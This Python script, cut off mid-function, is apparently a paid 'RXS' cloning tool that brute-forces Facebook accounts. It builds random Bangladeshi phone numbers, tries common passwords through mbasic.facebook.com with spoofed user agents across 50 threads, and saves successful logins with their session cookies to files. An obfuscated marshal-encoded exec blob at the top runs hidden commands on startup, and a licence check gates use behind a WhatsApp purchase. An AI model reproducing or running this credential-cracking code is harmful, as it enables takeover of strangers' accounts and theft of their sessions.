#!/usr/bin/python3
#-*-coding:utf-8-*-
#!/usr/bin/python3
# Tools make by RXS
import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform,struct
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import os
import random
import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform,struct
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import base64
import os,sys,time,json,random,re,string,platform,base64
import requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import mechanize
from requests.exceptions import ConnectionError
import string
import marshal
exec(marshal.loads(b"\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\xf3\xa6\x01\x00\x00\x97\x00d\x00d\x01l\x00Z\x00d\x00d\x01l\x01Z\x01d\x00d\x01l\x02Z\x02\x02\x00e\x00j\x03\x00\x00\x00\x00\x00\x00\x00\x00d\x02\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00e\x00j\x04\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00s!\x02\x00e\x06d\x04\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\x06d\x05\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\x07\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00n\x01\t\x00\x02\x00e\x06d\x06\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\x06d\x07\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\x00j\x03\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00e\x02j\x08\x00\x00\x00\x00\x00\x00\x00\x00d\x08\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\x06d\t\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\x00j\x03\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00e\x02j\x08\x00\x00\x00\x00\x00\x00\x00\x00d\n\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\x06d\x0b\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\x01j\t\x00\x00\x00\x00\x00\x00\x00\x00d\x0c\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x01S\x00)\r\xe9\x00\x00\x00\x00N\xda\x05clearz&/data/data/com.termux/files/usr/bin/rmuH\x00\x00\x00\n \x1b[1;92m[\x1b[1;91m\xe2\x9c\x94\x1b[1;92m]\x1b[1;91m Turn Off Your Local Bypass System...uA\x00\x00\x00\n \x1b[1;92m[\x1b[1;93m\xe2\x9c\x94\x1b[1;92m]\x1b[1;93m Turn Offf Your Data Protectorz*\n\t\t \x1b[1;91m[\x1b[1;92mSEFTY BY RXS\x1b[1;91m]\nz@\x1b[1;91m══════════════════════════════════════════════\x1b[1;93ms!\x00\x00\x00x\x9c+\xc8,P(\xcd\xcb\xcc+.I\xcc\xc9Q(J-,M-.)V\xd0\xad\x04\x00\x80\x10\t\xa6z@\x1b[1;91m══════════════════════════════════════════════\x1b[1;92ms\x1c\x00\x00\x00x\x9c+\xc8,P\xc8\xcc+.I\xcc\xc9Q(J-,M-.)\x06\x00Q\xe1\x07\xfdz9\x1b[1;91m══════════════════════════════════════════════\xe9\x03\x00\x00\x00)\n\xda\x02os\xda\x04time\xda\x04zlib\xda\x06system\xda\x04path\xda\x06exists\xda\x05print\xda\x04exit\xda\ndecompress\xda\x05sleep\xa9\x00\xf3\x00\x00\x00\x00\xda\x00\xfa\x08<module>r\x12\x00\x00\x00\x01\x00\x00\x00s\x10\x01\x00\x00\xf0\x03\x01\x01\x01\xd8\x00\t\x80\t\x80\t\x80\t\xd8\x00\x0b\x80\x0b\x80\x0b\x80\x0b\xd8\x00\x0b\x80\x0b\x80\x0b\x80\x0b\xd8\x00\t\x80\x02\x84\t\x88'\xd1\x00\x12\xd4\x00\x12\xd0\x00\x12\xd8\x07\t\x84w\x87~\x82~\xd0\x16>\xd1\x07?\xd4\x07?\xf0\x00\x05\x01\x06\xd8\x01\x06\x80\x15\xd0\x07^\xd1\x01_\xd4\x01_\xd0\x01_\xd8\x01\x06\x80\x15\xd0\x07W\xd1\x01X\xd4\x01X\xd0\x01X\xd8\x01\x05\x80\x14\x81\x16\x84\x16\x80\x16\x80\x16\xe0\x01\x05\xe0\x00\x05\x80\x05\xd0\x06?\xd1\x00@\xd4\x00@\xd0\x00@\xd8\x00\x05\x80\x05\xd0\x06N\xd1\x00O\xd4\x00O\xd0\x00O\xd8\x00\t\x80\x02\x84\t\x88/\x88$\x8c/\xd0\x1ai\xd1\nj\xd4\nj\xd1\x00k\xd4\x00k\xd0\x00k\xd8\x00\x05\x80\x05\xd0\x06N\xd1\x00O\xd4\x00O\xd0\x00O\xd8\x00\t\x80\x02\x84\t\x88/\x88$\x8c/\xd0\x1aZ\xd1\n[\xd4\n[\xd1\x00\\\xd4\x00\\\xd0\x00\\\xd8\x00\x05\x80\x05\xd0\x06D\xd1\x00E\xd4\x00E\xd0\x00E\xd8\x00\n\x80\x04\x84\n\x881\x81\r\x84\r\x80\r\x80\r\x80\rr\x10\x00\x00\x00"))
try:
    import requests
except ImportError:
    print('\n [âœ“] installing requests !...\n')
    os.system('pip install requests')
try:
    import concurrent.futures
except ImportError:
    print('\n [âœ“] installing futures !...\n')
    os.system('pip install futures')
try:
    import bs4
except ImportError:
    print('\n [âœ“] installing bs4 !...\n')
    os.system('pip install bs4')
R = '\033[1;31m' # PUTIH
G = '\033[1;32m' # PUTIH
H = '\033[1;32m' # PUTIH
Y = '\033[1;33m' # PUTIH
Q = '\033[1;37m'
T = '\033[1;34m'
import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
from concurrent.futures import ThreadPoolExecutor as ahmadAXI
from datetime import datetime
from bs4 import BeautifulSoup
R = '\x1b[1;91m' 
G = '\x1b[1;92m' 
Y = '\x1b[1;93m' 
### WARNA RANDOM ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
MXD = '\033[1;92m' #MAHADIGREEN
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
def banner():
    print("[=] ðŸ˜Œ Testing New mathod By RXS")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
P = '\x1b[1;97m' # 
M = '\033[1;31m' # 
H = '\033[1;32m' # 
K = '\x1b[1;97m' # 
B = '\x1b[1;97m' # 
U = '\x1b[1;95m' # 
O = '\x1b[1;97m' # 
N = '\x1b[0m'    # 
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,fuck,pwBaru=[],[],[]
ok = []
mnum=[]
cp = []
id = []
user = []
loop = 0
oks = []
cps = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://m.facebook.com"
url_ip = "https://www.httpbin.org/ip"
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 12; Nokia XR20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
done = False
ugen=[]
uas=[]
usa = ["Mozilla/5.0 Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))} (KHTML, like Gecko) Version/{str(rr(20,100))}.0.{str(rr(1111,9999))} Safari/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))}"]
rr = random.randint
for xd in range(3005):
    ff=(f'Mozilla/5.0 Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))} (KHTML, like Gecko) Version/{str(rr(20,100))}.0.{str(rr(1111,9999))} Safari/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))}')
    uas.append(ff)
for spy in range(9993,176281):
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='TRT-L53 Build/HUAWEITRT-L53; wv)'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/69.0.3497.100 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/192.0.0.34.85;]'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)
print('\033[1;91m[\033[1;32m✓\033[1;36m\033[1;91m] \033[1;96m CHECKING FOR UPDATE');time.sleep(1.0)
print('\033[1;91m[\033[1;32m✓\033[1;36m\033[1;91m] \033[1;96m UPDATE DONE!! ');time.sleep(1.0)
bit = platform.architecture()[0]
if bit == '64bit':
 print('\033[1;91m[\033[1;32m✓\033[1;36m\033[1;91m] \033[1;96m YOUR DEVICE IS 64 BIT');time.sleep(1.0)
elif bit == '32bit':
 print('\033[1;91m[\033[1;32m✓\033[1;36m\033[1;91m] \033[1;96m YOUR DEVICE IS 32 BIT');time.sleep(1.0)
def menu_apikey():
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "ᛇ".join(uuid)
  name = "ᛇRXS"
  server = requests.get('https://github.com/TAHOSIN-BRO/Te/blob/main/dai.txt').text
  
 

  os.system(" clear")                          
  print(f"""

\033[1;32m██████╗ ██╗  ██╗███████╗\033[1;37m
 \033[1;32m██╔══██╗╚██╗██╔╝██╔════╝\033[1;37m
 \033[1;32m██████╔╝ ╚███╔╝ ███████╗\033[1;37m
 \033[1;32m██╔══██╗ ██╔██╗ ╚════██║\033[1;37m
 \033[1;32m██║  ██║██╔╝ ██╗███████║\033[1;37m
 \033[1;32m╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝\033[1;37m \033[1;36m1.1.0\033[1;37m
\033[1;36m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;37m
\033[1;37m Owner   :            REYAD X SHIPU
\033[1;37m Facebook:            MD REYAD HOSSAIN SHANTO
\033[1;37m Github  :            BINOD-XD
\033[1;37m Whatsapp:            +8801989861704
\033[1;37m Note    :            \033[1;37mRANDOM & FILE CLONE
\033[1;36m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;37m""")
  print("\t \033[1;32m     FIRST GET APPROVAL\033[1;37m ")
  print("")
  print("\033[1;32    YOUR  KEY : "+id+name)
  print("")
  try:
    httpCaht = requests.get("https://github.com/TAHOSIN-BRO/Te/blob/main/dai.txt").text
    if id in httpCaht:
      print("\033[1;92m  YOUR KEY IS APROVED  ");time.sleep(2)
      msg = str(os.geteuid())
      time.sleep(0.5)
      pass
    else:
      
      print("\x1b[1;91m  SORRY YOUR KEY IS NOT APPROVED ")
      print("\x1b[1;92m  PLEASE CONTACT ADMIN TO BUY THIS TOOL ")
      input('   \x1b[0;37m \033[1;32mPRESS ENTER TO BUY TOOL ')
      os.system('xdg-open https://wa.me/+8801989861704?text=Assalamuwalaikum%20Sir,%20I%20Want%20To%20Buy%20Your%20RXS%20Paid%20Tool.%20My%20Key:%20'+id+name)
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
    if name == '__RXS__':
    	print(logo)
    	menu_apikey()
menu_apikey()
logo=("""
 \033[1;32m██████╗ ██╗  ██╗███████╗\033[1;37m
 \033[1;32m██╔══██╗╚██╗██╔╝██╔════╝\033[1;37m
 \033[1;32m██████╔╝ ╚███╔╝ ███████╗\033[1;37m
 \033[1;32m██╔══██╗ ██╔██╗ ╚════██║\033[1;37m
 \033[1;32m██║  ██║██╔╝ ██╗███████║\033[1;37m
 \033[1;32m╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝\033[1;37m \033[1;36m1.1.0\033[1;37m
\033[1;36m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;37m
\033[1;37m Owner   :            REYAD X SHIPU
\033[1;37m Facebook:            MD REYAD HOSSAIN SHANTO
\033[1;37m Github  :            BINOD-XD
\033[1;37m Whatsapp:            +8801989861704
\033[1;37m Note    :            \033[1;37mRANDOM & FILE CLONE
\033[1;36m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;37m""")
def cek_apk(session,coki):
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\r{N}[{M}!{N}] SORRY THERE IS NO ACTIVE APK")
	else:
		print("")
		print(f'\r🎮 %sYOUR ACTIVE APPLICATION DETAILS :'%(H))
		for i in range(len(game)):
			print("%s%s. %s%s"%(H,i+1,game[i].replace("ACTIVE"," ACTIVE"),N))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\r{N}[{M}!{N}] SORRY THERE IS NO EXPIRED APK")
	else:
		print(f'\r 🎮 %sYOUR EXPIRED APPLICATION DETAILS :'%(M))
		for i in range(len(game)):
			print("%s%s. %s%s"%(K,i+1,game[i].replace("Expired"," Expired"),N))
def RXS():
	os.system('clear')
	print(logo)
	print('\x1b[92m══════════════════════════════════════════════')
	print("[A] BD Random Cloner [GOOD]")
	print("[B] BD Number cloner [BEST]")
	print("[C] BD Uid cloner [BETTER]")
	print("[X] CONTRACT ADMIN")
	print('[E] Back')
	print("\x1b[92m══════════════════════════════════════════════")
	opt = input('\x1b[92mChoose option: \x1b[97m')
	if opt =='A':
		virus()
	if opt =='B':
		virus2()
	if opt =='C':
		virus3()
	if opt =='X':
		admin()
	elif opt =='E':
		exit()
	else:
		print('\n\033[1;92mCHOOSE VALID OPTION\033[0;97m');time.sleep(1)
		RXS()
def admin():
	os.system('clear')
	print(logo)
	print('\x1b[92m══════════════════════════════════════════════')
	print(' [1] Contract WhatsApp ')
	print(' [2] Follow Facebook ')
	print(' [3] Follow Github')
	print(' [0] Back Main Menu')
	print("\x1b[92m══════════════════════════════════════════════")
	bal = input('\x1b[92mChoose option: \x1b[97m')
	if bal =='1':
		os.system('xdg-open https://wa.me/+8801989861704');time.sleep(1)
		admin()
	if bal =='2':
		os.system('xdg-open https://www.facebook.com/reyadbross');time.sleep(1)
		admin()
	if bal =='3':
		os.system('xdg-open https://github.com/BINOD-XD');time.sleep(1)
		admin()
	if bal =='0':
		RXS()
	
def virus():
	user=[]
	os.system('clear')
	print(logo)
	print("[\033[1;92m•\033[1;97m]Sim Code Example : 016, 017, 018, 019")
	kode = input('\033[1;92m[√] Enter Sim Code: \033[1;97m')
	doamin ='BD Random Cloner [GOOD] '
	limit = int(input('[?] ENTER CRACK LIMIT : '))
	for nmbr in range(limit):
		koda = ''.join(random.choice(string.digits) for _ in range(2))
		kodb = ''.join(random.choice(string.digits) for _ in range(2))
		nmp = ''.join(random.choice(string.digits) for _ in range(4))
		user.append(nmp)
	with ThreadPool(max_workers=50) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print('\x1b[92m══════════════════════════════════════════════')
		print(' \033[1;97m[\033[1;92m𝜩\033[1;97m]  Total Account: '+tl)
		print(f"\033[1;97m [\033[1;92m𝜩\033[1;97m]  Varion:\033[1;97m {doamin}")
		print(' \033[1;97m[\033[1;92m𝜩\033[1;97m]  The Process Has Been Started')
		print(' \033[1;97m[\033[1;92m𝜩\033[1;97m]  Use Airplane Mode For Speed Up')
		print('\x1b[91m══════════════════════════════════════════════')
		for guru in user:
			uid = kode+koda+kodb+guru
			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','Bangladesh','i love you','i hate you','i have you','বাংলাদেশ']
			yaari.submit(a,uid,pwx,tl)
	print("")
	print('\x1b[92m══════════════════════════════════════════════')
	print(' \033[1;92m[✔] CRACK PROCESS HAS BEEN COMPLETED')
	print(' \033[1;92m[✔] Saved In RXS-OK.txt,RXS-CP.txt')
	print('\x1b[92m══════════════════════════════════════════════')
	exit()
def virus2():
	user=[]
	os.system('clear')
	print(logo)
	print("[\033[1;92m•\033[1;97m]Sim Code Example : 016, 017, 018, 019")
	kode = input('\033[1;92m[√] Enter Sim Code: \033[1;97m')
	doamin ='BD Number cloner [BEST] '
	limit = int(input('[?] ENTER CRACK LIMIT : '))
	for nmbr in range(limit):
		koda = ''.join(random.choice(string.digits) for _ in range(2))
		kodb = ''.join(random.choice(string.digits) for _ in range(2))
		nmp = ''.join(random.choice(string.digits) for _ in range(4))
		user.append(nmp)
	with ThreadPool(max_workers=50) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print('\x1b[92m══════════════════════════════════════════════')
		print(' \033[1;97m[\033[1;92m𝜩\033[1;97m]  Total Account: '+tl)
		print(f"\033[1;97m [\033[1;92m𝜩\033[1;97m]  Varion:\033[1;97m {doamin}")
		print(' \033[1;97m[\033[1;92m𝜩\033[1;97m]  The Process Has Been Started')
		print(' \033[1;97m[\033[1;92m𝜩\033[1;97m]  Use Airplane Mode For Speed Up')
		print('\x1b[92m══════════════════════════════════════════════')
		for guru in user:
			uid = kode+koda+kodb+guru
			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','Bangladesh','i love you','i hate you','i have you','বাংলাদেশ']
			yaari.submit(b,uid,pwx,tl)
	print("")
	print('\x1b[92m══════════════════════════════════════════════')
	print(' \033[1;92m[✔] CRACK PROCESS HAS BEEN COMPLETED')
	print(' \033[1;92m[✔] Saved In RXS-OK.txt,RXS-CP.txt')
	print('\x1b[92m══════════════════════════════════════════════')
	exit()
def virus3():
	user=[]
	os.system('clear')
	print(logo)
	print("[\033[1;92m•\033[1;97m]Sim Code Example : 016, 017, 018, 019")
	kode = input('\033[1;92m[√] Enter Sim Code: \033[1;97m')
	doamin ='BD Uid cloner [BETTER] '
	limit = int(input('[?] ENTER CRACK LIMIT : '))
	for nmbr in range(limit):
		koda = ''.join(random.choice(string.digits) for _ in range(2))
		kodb = ''.join(random.choice(string.digits) for _ in range(2))
		nmp = ''.join(random.choice(string.digits) for _ in range(4))
		user.append(nmp)
	with ThreadPool(max_workers=50) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print('\x1b[92m══════════════════════════════════════════════')
		print(' \033[1;97m[\033[1;92m𝜩\033[1;97m]  Total Account: '+tl)
		print(f"\033[1;97m [\033[1;92m𝜩\033[1;97m]  Varion:\033[1;97m {doamin}")
		print(' \033[1;97m[\033[1;92m𝜩\033[1;97m]  The Process Has Been Started')
		print(' \033[1;97m[\033[1;92m𝜩\033[1;97m]  Use Airplane Mode For Speed Up')
		print('\x1b[92m══════════════════════════════════════════════')
		for guru in user:
			uid = kode+koda+kodb+guru
			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','Bangladesh','i love you','i hate you','i have you','বাংলাদেশ']
			yaari.submit(c,uid,pwx,tl)
	print("")
	print('\x1b[92m══════════════════════════════════════════════')
	print(' \033[1;92m[✔] CRACK PROCESS HAS BEEN COMPLETED')
	print(' \033[1;92m[✔] Saved In RXS-OK.txt,RXS-CP.txt')
	print('\x1b[92m══════════════════════════════════════════════')
	exit()
def a(uid,pwx,tl):
    global loop
    global cps    
    global oks
    global agents
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mRXS\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            #oo=random.choice(sss)
            free_fb = session.get('mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',
           'method': 'GET', 
            'scheme': 'https', 
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro}
            lo = session.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\r\33[1;92m [RXS-OK] '+cid+' | '+ps+'\33[0;92m')
                print(f'\r\033[1;92m [🍪] COOKIE : '+coki)
                open('/sdcard/RXS-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\r\x1b[38;5;196m[RXS-CP] {uid} | {ps}")
                #print(f'{W}CP-UA--> {pro}\n ')
                open('/sdcard/RXS-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[RXS] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
       # sys.stdout.write(f" \r{R} [{B}RXS{R}]  {P}[{k}{loop}{P}/{h}{len(id)}{P}]Ã¢â‚¬â€{P}[{H}{ok}{P}]Ã¢â‚¬â€{P}[{k}{cp}{x}]Ã¢â‚¬â€[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  ")
        sys.stdout.flush()
    except:
        pass
def b(uid,pwx,tl):
    global loop
    global cps    
    global oks
    global agents
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mRXS\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            #oo=random.choice(sss)
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'user-agent', 'Mozilla/5.0 (Linux; U; Android 4;  en-us; GT-D778E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4278.115 Mobile Safari/537.36'
'accept-encoding', 'gzip, deflate, br'
'accept', 'application/x-www-form-urlencoded'
'Connection', 'keep-alive'
'authority', 'p.facebook.com'
'method', 'POST'
'scheme', 'https'
'accept-language', 'en-US,en;q=0.9'
'cache-control', 'no-cache, no-store, must-revalidate'
'referer', 'https://p.facebook.com/'
'sec-ch-ua', '"Chromium";v="107", "Not=A?Brand";v="24"'
'sec-ch-ua-mobile', '?1'
'sec-ch-ua-platform', 'Windows'
'sec-fetch-dest', 'empty'
'sec-fetch-mode', 'cors'
'sec-fetch-site', 'same-origin'
'sec-fetch-user', '?0'
'pragma', 'no-cache'
'priority', 'u=0'
'cross-origin-resource-policy', 'cross-origin'
'upgrade-insecure-requests', '1'}
            lo = session.post('https://mbasic.facebook.com/login/?li=M_FMZPQDtUrZZ-CY28HLNnun&e=1348029&shbl=1&ref=dbl&refsrc=deprecated&_rdr',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\r\33[1;92m [RXS-OK] '+cid+' | '+ps+'\33[0;92m')
                print(f'\r\33[1;92m [✨] Number : {uid}')
                print(f'\r\033[1;92m [🍪] COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/RXS-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
    except:
        pass
def c(uid,pwx,tl):
    global loop
    global cps    
    global oks
    global agents
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mRXS\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            #oo=random.choice(sss)
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',
           'method': 'GET', 
            'scheme': 'https', 
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro}
            lo = session.post('https://mbasic.facebook.com/login/?li=M_FMZPQDtUrZZ-CY28HLNnun&e=1348029&shbl=1&ref=dbl&refsrc=deprecated&_rdr',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
